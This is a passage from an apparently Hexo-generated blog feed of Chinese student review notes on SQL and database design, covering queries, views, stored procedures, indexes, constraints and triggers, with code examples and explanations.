class="keyword">FROM</span> S S1</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> Csharp</span><br><span class="line">   <span class="keyword">FROM</span> C C1</span><br><span class="line">   <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> </span><br><span class="line">   (<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">      <span class="keyword">FROM</span> SC</span><br><span class="line">      <span class="keyword">WHERE</span> Csharp<span class="operator">=</span>C1.Csharp</span><br><span class="line">      <span class="keyword">AND</span> Ssharp<span class="operator">=</span>S1.Ssharp))</span><br></pre></td></tr></table></figure>&gt;1. 从学生表S（别名S1）中选择一个学生。&gt;2. 接着查看课程表C（别名C1）中的每一条课程记录。&gt;3. 对于每个课程，查询选课记录表SC看是否存在一条记录满足以下两个条件：课程号Csharp与当前遍历到的课程C1.Csharp相同，且学生号Ssharp与之前选取的学生S1.Ssharp相同。&gt;4. 如果某个课程没有对应上述条件的记录，即某个课程没有被这名学生选修，那么NOT EXISTS条件为真，这意味着C1（即当前遍历的课程）就是这名学生没有选修的课程之一。&gt;5. 如果存在任何一个这样的课程（即第二层NOT EXISTS条件为真），说明这名学生并没有选修所有的课程，那么外层的NOT EXISTS条件就为假，这名学生就不会被包含在最终的结果集中。&gt;6. 只有当一个学生选修了所有课程，即内层SELECT语句没有找到任何课程（第二层NOT EXISTS条件为假），外层的NOT EXISTS才为真，这名学生的SNAME才会被SELECT语句选取。#### 16.测试集合是否存在重复元组unique (子查询)如果子查询中没有重复元组，则返回true<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> PNAME</span><br><span class="line"><span class="keyword">from</span> PROFF</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">unique</span></span><br><span class="line">(<span class="keyword">select</span> Psharp</span><br><span class="line">   <span class="keyword">from</span> PC</span><br><span class="line">   <span class="keyword">where</span> PC.Psharp<span class="operator">=</span>PROF.Psharp)</span><br></pre></td></tr></table></figure>#### 17.派生关系<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(子查询) <span class="keyword">as</span> 关系名(列名，列名,...)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>       SNAME ， AVG_GRADE</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  (<span class="keyword">select</span>SNAME ， avg（GRADE）</span><br><span class="line"><span class="keyword">from</span>  S，SC</span><br><span class="line"><span class="keyword">where</span> SC.Ssharp <span class="operator">=</span> S.Ssharp</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>SNAME)</span><br><span class="line">       <span class="keyword">as</span>    <span class="keyword">result</span>(SNAME ， AVG_GRADE )</span><br><span class="line"><span class="keyword">where</span>   AVG_GRADE  <span class="operator">&gt;=</span>  <span class="number">60</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>#### 18.集合操作**集合并(union(all))****集合交(intersect(all))****集合差(except(all))**&gt; #### 无all的结果会去重，有all的结果不会去重&gt;&gt; intersect 的优先级高于其他集合操作的优先级#### 19.笛卡尔乘积 自然连接运算==笛卡尔乘积运算==<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> b<span class="operator">*</span>,s<span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span> Branch <span class="keyword">AS</span> B,staff <span class="keyword">AS</span> s</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="number">2.</span></span><br><span class="line"><span class="keyword">SELECT</span> b<span class="operator">*</span>,s<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Brach b</span><br><span class="line"><span class="keyword">JOIN</span> staff </span><br></pre></td></tr></table></figure>//from两个表就做了一次笛卡尔乘积运算==自然连接运算==<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> b<span class="operator">*</span>,s.name,staffNo,position </span><br><span class="line"><span class="keyword">FROM</span> Branch <span class="keyword">AS</span> b,staff s</span><br><span class="line"><span class="keyword">WHERE</span> b.deptNo<span class="operator">=</span>s.deptNo</span><br></pre></td></tr></table></figure>#### 20.关系的链接![image-20240407112419661](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240407112419661.png)#### 21.不等号 &lt;&gt;#### 22.查询结果作为添加操作的输入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> enroll(sno, cno, semester) (<span class="keyword">SELECT</span> sno, ‘H61030008’, ’<span class="number">2018</span><span class="operator">/</span><span class="number">01</span>’ <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> dno <span class="operator">=</span>’<span class="number">24</span>’ <span class="keyword">AND</span> sno <span class="keyword">LIKE</span> ’<span class="number">2018</span><span class="operator">%</span>’);</span><br></pre></td></tr></table></figure>**insert into 表明 [(列名[,列名]...)] (子查询)**#### 23.复制**复制一个数据文件到数据库中**<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bulk <span class="keyword">insert</span> 表名 </span><br><span class="line"><span class="keyword">from</span>  数据文件</span><br><span class="line"><span class="keyword">with</span></span><br><span class="line">(batchsize <span class="operator">=</span> 指定批处理中的行数,</span><br><span class="line">check_constraints,</span><br><span class="line">datafiletype <span class="operator">=</span> 数据文件类型,</span><br><span class="line">fieldterminator <span class="operator">=</span> 字段终止符, </span><br><span class="line">maxerrors <span class="operator">=</span> 所容忍的最大错误数目, </span><br><span class="line">rowterminator <span class="operator">=</span> 行终止符)</span><br></pre></td></tr></table></figure>#### 24.更新操作<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名</span><br><span class="line"><span class="keyword">set</span> 列名<span class="operator">=</span>表达式<span class="operator">|</span>子查询</span><br><span class="line">列名<span class="operator">=</span>[.表达式<span class="operator">|</span>子查询]</span><br><span class="line">[<span class="keyword">where</span> 条件表达式]</span><br></pre></td></tr></table></figure>e.g.老师工资上调5%<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> PROF</span><br><span class="line"><span class="keyword">set</span> SAL<span class="operator">=</span>SAL<span class="operator">*</span><span class="number">1.05</span></span><br></pre></td></tr></table></figure>类似于switch...case<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> PROF</span><br><span class="line"><span class="keyword">set</span> SAL<span class="operator">=</span></span><br><span class="line"><span class="keyword">case</span> SAL</span><br><span class="line"><span class="keyword">when</span> SAL<span class="operator">&gt;</span><span class="number">200</span> <span class="keyword">then</span> SAL<span class="operator">*</span><span class="number">0.9</span></span><br><span class="line"><span class="keyword">when</span> SAL<span class="operator">&lt;=</span><span class="number">200</span> <span class="keyword">then</span> SAL<span class="operator">*</span><span class="number">0.95</span></span><br></pre></td></tr></table></figure>#### 25.删除操作==delete==<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 [<span class="keyword">where</span> 条件表达式]</span><br></pre></td></tr></table></figure>&gt; 从表中删除符合条件的元组，没有就全部删除#### ==truncate table==- 删除表中的所有行，而不记录单个行删除操作- truncate table在功能上与不带where子句的delete语句相同。但truncate table比delete速度快，且使用的系统和事务日志资源少- identity计数器重置为种子值#### 26.总结关系型数据库中部的表有三性：专一性、全局性、联系性用户的业务数据表：局部性、综合性、多样性### 五.数据库定义功能（创建表、三级模式、视图、存储过程）#### 1.操作符| SQL功能  | 操作符               || -------- | -------------------- || 数据查询 | SELECT               || 数据定义 | CREATE,ALTER,DROP    || 数据操纵 | INSERT,UPDATE,DELETE || 数据控制 | GRANT,REVOKE         |#### 2.域类型- char(n):固定长度的字符串- varchar(n)：可变长字符串- int：整数- smallint：小整数类型- numeric(p,d)：定点数，小数点左边p位，右边q位- real:浮点数- double prrecision：双精度浮点数- date:日期- time：时间- inerval：两个date或time类型数据之间的差#### 3.基本表的定义(CREATE)<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span>  <span class="keyword">table</span>   表名（</span><br><span class="line">   列名  数据类型  [<span class="keyword">default</span>  缺省值]  [<span class="keyword">not</span> <span class="keyword">null</span>] [<span class="keyword">unique</span>]</span><br><span class="line">   [，列名 数据类型  [<span class="keyword">default</span>  缺省值]  [<span class="keyword">not</span> <span class="keyword">null</span>]]</span><br><span class="line">   [，<span class="keyword">primary</span>  key（列名 [，列名] …）]</span><br><span class="line">   [，<span class="keyword">foreign</span>  key （列名 [，列名] …） </span><br><span class="line">      <span class="keyword">references</span>  表名 （列名 [，列名] …）]</span><br><span class="line">    [，<span class="keyword">check</span>（条件）]）</span><br><span class="line"></span><br></pre></td></tr></table></figure>![image-20240408195435827](https://s2.loli.net/2024/04/13/HjP9hXM85GdApWq.png)#### 4.修改表的定义(ALTER)格式：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名</span><br><span class="line"> [<span class="keyword">add</span> 子句] <span class="operator">/</span><span class="operator">/</span>增加新列和约束</span><br><span class="line"> [<span class="keyword">drop</span> 子句] <span class="operator">/</span><span class="operator">/</span>删除列和约束</span><br><span class="line"> [modify 子句] <span class="operator">/</span><span class="operator">/</span>修改列定义</span><br></pre></td></tr></table></figure>#### 5.撤销基本表的定义(drop)格式：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 表名</span><br></pre></td></tr></table></figure>#### 6.临时表&gt;- 草稿簿，试验中间的数据处理&gt;- 只记录回滚信息，不记录重做信息&gt;- 临时表上的数据更新比其他表快4倍==私有临时表==<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sharpmy_table</span><br></pre></td></tr></table></figure>==全局临时表==<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sharpsharpmy_table</span><br></pre></td></tr></table></figure>==tempdb==<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> my_table</span><br></pre></td></tr></table></figure>#### 7.结构数据模型的三要素- 数据结构- 数据操作- 数据的约束条件#### 8.关系模型==优点==- 简单，表的概念直观、单一，用户易理解- 非过程化的数据请求，数据请求可以不指明路径- 数据独立性，用户只需提出“做什么”，无须说明“怎么做”- 坚实的理论基础==缺点==- 效率低~&gt;nosql#### 9.数据库模式![image-20240408200739499](https://s2.loli.net/2024/04/12/X94POZcoJabg1KQ.png)- 外模式  - 用户的数据视图  - 是数据的局部逻辑结构，模式的子集- 模式或者概念模式  - 所用用户的公共数据视图  - 是数据库中全体数据的全局逻辑结构和特性的描述- 内模式  - 又称存储模式  - 是数据的物理结构及存储方式==外模式/模式映像==- 定义某一个外模式和模式之间的对应关系，映象定义通常包含在各外模式中- 当模式改变时，修改外模式/模式映象，使外模式保持不变，从而应用程序可以保持不变，称为数据的逻辑独立性==模式/内模式影响==- 定义数据逻辑结构与存储结构之间的对应关系- 存储结构改变时，修改模式/内模式映象，使模式保持不变，从而应用程序可以保持不变，称为数据的物理独立性**外模式/模式映射 视图，存储过程**三级模式结构及二级映像实现了数据库系统的数据独立性#### 10.视图##### **定义视图**<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> view_name[(列名[,列名]...)]</span><br><span class="line"><span class="keyword">as</span> (查询表达式)</span><br><span class="line">[<span class="keyword">with</span> <span class="keyword">check</span> option]</span><br></pre></td></tr></table></figure>&gt;视图的属性名缺省为子查询结果中的属性名，也可以显式指明&gt;&gt;with check option指明当对视图进行insert，update时，要检查是否满足视图定义中的条件##### **撤销视图**<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> view_name</span><br></pre></td></tr></table></figure>&gt; 视图是一个虚拟表，定义在一个查询上，因此视图对应的虚拟表的行的集合就是该查询的结果集##### **特点**- 当用户需要读取视图对应的结果集时，系统会**临时执行**视图对应的查询，生成临时表供使用，临时表在执行完后不再存在，视图保持为虚拟表- sql的语句中，子查询容易大幅增加查询语句的复杂度，因此视图有利于简化用户的查询，也能对用户屏蔽底层细节，并且**视图并不实际存储数据**，空间开销忽略不计- 实际上，有时也存在物化视图，即实际生成一个持久化的针对视图的数据表，以提升频繁访问视图的操作的效率##### **优点**==个性化服务==简化了用户观点，不同用户可以从不同角度观察同一数据==安全性==“纸币所需&quot;,限制用户数据的访问范围==逻辑独立性==试图作为基本表与外模式之间的映像![image-20240408202641861](https://s2.loli.net/2024/04/12/JlX4SyF5RiQwxBa.png)##### **进行权限授权**<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">SELECT</span> <span class="keyword">on</span> avg_sal <span class="keyword">to</span>&quot;Tom&quot;<span class="operator">/</span><span class="operator">/</span>授予Tom只有查看职工平均工资的权限</span><br></pre></td></tr></table></figure>##### **进行视图更新**<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> S </span><br><span class="line"><span class="keyword">values</span> (<span class="keyword">null</span>,&quot;张立&quot;,<span class="number">23</span>,<span class="keyword">null</span>)<span class="operator">/</span><span class="operator">/</span>向视图中插入数据</span><br></pre></td></tr></table></figure>（其实就是把表明换成视图名)##### 视图更新约束- select子句中的目标列不能包含聚集函数- select子句中不能使用unique或distinct关键字- 不能包括group by子句- 不能包括经算术表达式计算出来的列- 对于行列子集视图一般可以更新（视图是从单个基本表使用选择、投影操作导出的，并且包含了基本表的主码）##### 物化视图- 视图的计算结果被实际存储起来- 物化视图可以看成是数据库的cache- 查询物化视图比重新计算视图要快许多- 需要进行物化视图与基本表之间的一致性维护- 应用场合  &gt; 任何需要快速访问派生数据、或视图的重新计算非常昂贵、或查询需要耗费非常高的CPU和磁盘吞吐量的应用场合，都可以使用物化视图来提高效率**其他好处**1. 实现了应用程序与数据库的彼此独立，通用性增强，应用程序只见视图，不见表2. 增强安全。##### 视图存在的问题没有灵活应变性#### 11.存储过程##### 优点：提升试图的适应性，使其通用化e.g.<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> my_students(<span class="variable">@semesterV</span> <span class="keyword">IN</span> <span class="type">VARCHAR</span>, <span class="variable">@courserV</span> <span class="keyword">IN</span> <span class="type">VARCHAR</span>, <span class="variable">@teacherV</span> <span class="keyword">IN</span> <span class="type">VARCHAR</span>）<span class="keyword">AS</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">SELECT</span> studentNo, name, class </span><br><span class="line">    <span class="keyword">FROM</span> student <span class="keyword">AS</span> S, enroll <span class="keyword">AS</span> E, course <span class="keyword">AS</span> C, teacher <span class="keyword">AS</span> T</span><br><span class="line">    <span class="keyword">WHERE</span> S.studentNo <span class="operator">=</span> E.studentNo </span><br><span class="line">                   <span class="keyword">AND</span> C.courseNo <span class="operator">=</span> E.courseNo </span><br><span class="line">                   <span class="keyword">AND</span> T.teacherNo <span class="operator">=</span>E.teacherNo </span><br><span class="line">                   <span class="keyword">AND</span>Ｃ.name <span class="operator">=</span> <span class="variable">@courseV</span> </span><br><span class="line">                   <span class="keyword">AND</span>  Ｅ.semester <span class="operator">=</span><span class="variable">@semesterV</span> </span><br><span class="line">                   <span class="keyword">AND</span> T.name<span class="operator">=</span><span class="variable">@teacherV</span>;</span><br><span class="line"><span class="keyword">END</span>; </span><br></pre></td></tr></table></figure>用户:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> my_students(<span class="string">&#x27;2014/01&#x27;</span>,<span class="string">&#x27;数据库&#x27;</span>,<span class="string">&#x27;杨金珉&#x27;</span>)</span><br></pre></td></tr></table></figure>##### 存储过程带来的好处- 应用程序或者用户见到的是存储过程，视图，而不是表- 用户不用学SQL- 因为带变量，有很强的适用性和通用性- 能够将业务规则约束，放在存储过程中加以实现- 函数可以带上返回值##### 视图和存储过程的差异和联系- 在用户看来，视图是一个表，存储过程是一个具备特定功能的函数；- 视图既然是一个表，用户就可在其上进行五大数据操作；对存储过程，则不具备这种特性；- 存储过程尽管它的功能固定，但是带有变量，因此具有适配性，能够满足不同参数下的同一功能要求；</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#数据库复习(算是?)&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
  &lt;br&gt;
  &lt;/p&gt;&lt;h2 style=&quot;text-align:center;color:#F4E0EA&quot;&gt;
    樱春雪
    &lt;/h2&gt;
  &lt;br&gt;
  &lt;br&gt;
    &lt;div sty</summary>
      
    
    
    
    <category term="数据库" scheme="https://ycx6666.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="数据库" scheme="https://ycx6666.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="总结" scheme="https://ycx6666.github.io/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>数据库复习2</title>
    <link href="https://ycx6666.github.io/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/"/>
    <id>https://ycx6666.github.io/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/</id>
    <published>2024-04-04T22:00:00.000Z</published>
    <updated>2024-04-15T10:46:36.406Z</updated>
    
    <content type="html"><![CDATA[<p>#数据库复习(算是?)2</p><p align="center">  <br>  </p><h2 style="text-align:center;color:#F4E0EA">    樱春雪    </h2>  <br>  <br>    <div style="text-align:center">    <a href="https://codeload.github.com/liangjingkanji/DrakeTyporaTheme/zip/refs/heads/master">湖南大学</a>  | <a href="https://theme.typora.io/theme/Drake/">软件工程</a>  | <a href="https://github.com/liangjingkanji/DrakeTyporaTheme/blob/master/issues.md">22级</a></div><br><br>  <br><p></p><h3 id="六-数据库定义功能2"><a href="#六-数据库定义功能2" class="headerlink" title="六.数据库定义功能2"></a>六.数据库定义功能2</h3><h4 id="1-索引查询"><a href="#1-索引查询" class="headerlink" title="1.索引查询"></a>1.索引查询</h4><p><strong>定义</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> [<span class="keyword">unique</span>] [cluster] index 索引名</span><br><span class="line"><span class="keyword">on</span> 表名 (列名[<span class="keyword">asc</span><span class="operator">|</span><span class="keyword">desc</span>] [,列名 <span class="keyword">asc</span><span class="operator">|</span><span class="keyword">desc</span>])</span><br></pre></td></tr></table></figure><ol><li>unique：唯一性索引，不允许表中不同的行在索引列上取相同值。若已经有相同值存在，则系统给出相关信息，不坚辞索引。系统拒绝未被唯一性的插入和更新</li><li>cluster：聚簇索引，表中元组按照索引项的值排序并物理的聚簇在一起(索引码到指针的则是非物理聚簇)。一个基本表上只能建一个聚簇索引。</li><li>asc&#x2F;desc:索引表中索引值的排序次序，缺省为asc。</li></ol><p>&#x3D;&#x3D;注意&#x3D;&#x3D;</p><blockquote><p>create table时指定的主键或者unique列，均会出发系统<strong>自动创建</strong>响应的索引用作重复性检查。</p></blockquote><p>![image-20240408165335994](<a href="https://cdn.jsdelivr.net/Ycx6666">https://cdn.jsdelivr.net/Ycx6666</a> &#x2F; TyporaImage&#x2F;KahGvUJ961qYsMb.png)</p><h4 id="2-组合索引"><a href="#2-组合索引" class="headerlink" title="2.组合索引"></a>2.组合索引</h4><ul><li>建立在多个属性列上的索引</li><li>如果组合索引建立在A,B,C上，那他只对检索A,A+B,A+B+C列的查询起作用。</li></ul><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/OBAinmqZMIeY3aS.png" alt="image-20240408165634068"></p><h4 id="3-索引的删除"><a href="#3-索引的删除" class="headerlink" title="3.索引的删除"></a>3.索引的删除</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> index 索引名</span><br></pre></td></tr></table></figure><blockquote><p>drop index 语句不适用于定义主键或者unique约束时系统自动创建的索引，他们必须通过删除约束来撤销</p></blockquote><h4 id="4-索引的其他说明"><a href="#4-索引的其他说明" class="headerlink" title="4.索引的其他说明"></a>4.索引的其他说明</h4><ul><li><p>可以动态地定义索引，即可以随时建立和删除索引</p></li><li><p>不允许用户在数据操作中引用索引。索引如何使用完全由系统决定，这支持了数据的物理独立性</p></li><li><p>应该在使用频率高的、经常用于连接的列上建索引</p></li><li><p>一个表上可建多个索引。索引可以提高查询效率，但索引过多耗费空间，且降低了插入、删除、更新的效率</p></li></ul><h4 id="5-数据完整性的四大保障措施"><a href="#5-数据完整性的四大保障措施" class="headerlink" title="5.数据完整性的四大保障措施"></a>5.数据完整性的四大保障措施</h4><ul><li>主键约束</li><li>外键约束</li><li>域约束</li><li>业务规则约束</li></ul><h4 id="6-一个带有唯一性声明的属性上有多少个NULL-–不限制"><a href="#6-一个带有唯一性声明的属性上有多少个NULL-–不限制" class="headerlink" title="6.一个带有唯一性声明的属性上有多少个NULL  –不限制"></a>6.一个带有唯一性声明的属性上有多少个NULL  –不限制</h4><h4 id="7-Foreign-key"><a href="#7-Foreign-key" class="headerlink" title="7.Foreign key"></a>7.Foreign key</h4><blockquote><p>作为主码的关系成为基本关系，作为外码的关系称为依赖关系</p></blockquote><p>&#x3D;&#x3D;删除基本关系元组&#x3D;&#x3D;</p><ul><li>RESTRICT方式</li></ul><p>​只有当依赖关系中没有一个外码与要删除的基本关系的主码值相对应时，才可以删除该元组，否则系统拒绝此删除操作。</p><ul><li>CASCADE方式</li></ul><p>​将依赖关系中所有的外码之与基本关系中要删除的主码值所对应的元组一起删除。</p><ul><li><p>SET NULL方式</p><p>删除基本关系中元组时，将依赖关系中与基本关系中被删主码值相对应的外码值置为空值。</p><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/RAF6QjY3gpoyPXd.png" alt="image-20240408171436210"></p></li></ul><h4 id="8-全局约束"><a href="#8-全局约束" class="headerlink" title="8.全局约束"></a>8.全局约束</h4><blockquote><p>全局约束涉及多个属性见的或多个关系间的联系</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> SC</span><br><span class="line">(Ssharp   <span class="type">CHAR</span>(<span class="number">4</span>),</span><br><span class="line"> Csharp   <span class="type">CHAR</span>(<span class="number">4</span>),</span><br><span class="line"> GRADE   <span class="type">SMALLINT</span>,</span><br><span class="line"> primay key (Ssharp, Csharp),</span><br><span class="line"> <span class="keyword">check</span>(Ssharp <span class="keyword">in</span> (<span class="keyword">select</span> Ssharp <span class="keyword">from</span> S)),</span><br><span class="line"> <span class="keyword">check</span>(Csharp <span class="keyword">in</span> (<span class="keyword">select</span> Csharp <span class="keyword">from</span> C)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;如果S中删除元组，不会触发CHECK子句，只有对SC表的更新才会触发。&#x3D;&#x3D;</p><h4 id="9-对约束的命名、撤销和添加"><a href="#9-对约束的命名、撤销和添加" class="headerlink" title="9.对约束的命名、撤销和添加"></a>9.对约束的命名、撤销和添加</h4><p>命名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constraint</span> 约束名 <span class="operator">&lt;</span>约束条件<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ssharp <span class="type">CHAR</span>(<span class="number">4</span>) <span class="keyword">constraint</span> S_PK <span class="keyword">primary</span> key</span><br></pre></td></tr></table></figure><h5 id="关系上约束的撤销和添加"><a href="#关系上约束的撤销和添加" class="headerlink" title="关系上约束的撤销和添加"></a>关系上约束的撤销和添加</h5><p>撤销用 <code>alter table...drop constraint... </code></p><p>添加用 <code>alter table...add constraint...</code></p><p><strong>示例：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> S <span class="keyword">drop</span> <span class="keyword">constraint</span> S_PK</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> SC <span class="keyword">add</span> <span class="keyword">constraint</span> SC_CHECK <span class="keyword">check</span> (Ssharp <span class="keyword">in</span> <span class="keyword">select</span> Ssharp <span class="keyword">from</span> S)</span><br></pre></td></tr></table></figure><h4 id="10-触发器"><a href="#10-触发器" class="headerlink" title="10.触发器"></a>10.触发器</h4><ul><li>表模式(Schema)的定义中，包含了主键、外键、域约束的定义；</li><li>业务规则约束用触发器来定义；</li><li>所有完整性约束在DBMS内部最终都用触发器来表示；</li><li>操作会先出发约束检查和处理，确认可以操作之后才完成操作。</li></ul><blockquote><p>&#x3D;&#x3D;BEFORE触发器&#x3D;&#x3D;在语句开始做任何增删改查之前就被触发。</p><p>&#x3D;&#x3D;AFTER触发器&#x3D;&#x3D;在语句结束后触发</p><p>&#x3D;&#x3D;INSTEAD OF触发器&#x3D;&#x3D;只能在定义视图上</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> trigger_insertEnroll</span><br><span class="line">BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> enroll</span><br><span class="line"><span class="keyword">REFERENCING</span> <span class="keyword">NEW</span> <span class="type">ROW</span> <span class="keyword">AS</span> <span class="keyword">new</span></span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">creditAll <span class="type">integer</span><span class="operator">/</span><span class="operator">/</span>定义一个整型变量</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(credit) <span 